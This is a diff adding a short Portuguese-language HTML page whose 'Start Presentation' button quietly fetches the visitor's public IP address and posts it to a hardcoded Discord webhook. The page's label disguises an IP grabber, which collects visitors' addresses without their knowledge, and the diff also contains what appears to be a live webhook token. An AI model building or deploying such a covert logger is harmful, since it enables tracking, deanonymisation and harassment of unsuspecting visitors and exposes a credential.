@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enviar IP para Webhook</title>
+</head>
+<body>
+
+<button onclick="enviarIP()">Começar Apresentação</button>
+
+<script>
+function enviarIP() {
+    var enderecoIP = '';
+
+    fetch('https://api.ipify.org/?format=json')
+    .then(response => response.json())
+    .then(data => {
+        enderecoIP = data.ip;
+
+        enviarParaWebhook(enderecoIP);
+    })
+    .catch(error => console.error('Erro ao obter endereço IP:', error));
+}
+
+function enviarParaWebhook(ip) {
+    var webhookURL = 'https://discord.com/api/webhooks/1221914262449033287/TM67-81xuB-FAnvfUZJioTf6Viuw0zuQMtdk_Jild2u2Xhxrt2IjtTMx0fyVabFHPDzj';
+
+    var dados = {
+        ip: ip
+    };
+
+    var requestOptions = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(dados)
+    };
+
+    fetch(webhookURL, requestOptions)
+    .then(response => console.log('IP enviado com sucesso:', response))
+    .catch(error => console.error('Erro ao enviar IP para webhook:', error));
+}
+</script>
+
+</body>
+</html>
